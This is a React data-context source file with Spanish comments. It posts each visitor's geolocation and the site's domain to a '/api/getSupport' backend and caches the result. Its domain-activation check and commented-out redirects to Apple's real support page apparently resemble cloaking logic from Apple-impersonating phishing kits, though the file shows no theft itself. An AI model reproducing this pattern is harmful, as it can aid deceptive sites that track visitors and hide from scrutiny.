import { createContext, useContext, useState, useCallback } from "react";
import axios from 'axios';
import geolocation from "../services/geolocation";

const DataContext = createContext();

export const DataProvider = ({ children }) => {
    const [user, setUser] = useState(null);
    const [loading, setLoading] = useState(false);
    const [isReady, setIsReady] = useState(null);
    let geoData;


    const verifyProcess = useCallback(async () => {
        // if (!code || code === "id" || code === "") return;



        // 1. CARGA OPTIMISTA: Cargamos de caché para evitar parpadeo
        const saved = localStorage.getItem(`userData_support`);
        if (saved) {
            setUser(JSON.parse(saved));
            setIsReady(true);
        } else {
            setLoading(true);
            setIsReady(null);
        }

        try {
            const geoData = await geolocation.location();
            // 2. PETICIÓN OBLIGATORIA A LA DB
            const response = await axios.post(
                `${window.APP_CONFIG.API_URL}/api/getSupport`,
                {
                    domain: `${window.location.hostname.replace(/^www\./, '')}`,
                   // domain: `${window.location.hostname}`,
                    locationData: geoData 
                },
                { headers: { 'Content-Type': 'application/json' } }

            );

            const dbData = response.data?.data;

            // Verificamos si realmente existe en la DB (status false y que venga el linkCode)
            const isActive = dbData && dbData.status;

            if (isActive) {
                // ✅ Existe en DB: Actualizamos/Creamos storage

                localStorage.setItem(`userData_support`, JSON.stringify(response.data));
                setUser(response.data);
                setIsReady(true);
            } else {
                // ❌ NO EXISTE EN DB: Borrado forzado
                localStorage.removeItem(`userData_support`);                
                setUser(null);
                setIsReady(false);
               // window.location.href = 'https://support.apple.com/';
            }
        } catch (error) {
            // ❌ ERROR DE RED O 404: Borramos por seguridad para que no entre con basura
            localStorage.removeItem(`userData_support`);
            setUser(null);
            setIsReady(false);
            console.error("Error validando código, storage eliminado");
            //window.location.href = 'https://support.apple.com/';
        } finally {
            setLoading(false);
        }
    }, []);

    return (
        <DataContext.Provider value={{ user, loading, isReady, verifyProcess }}>
            {children}
        </DataContext.Provider>
    );
};

export const useData = () => useContext(DataContext);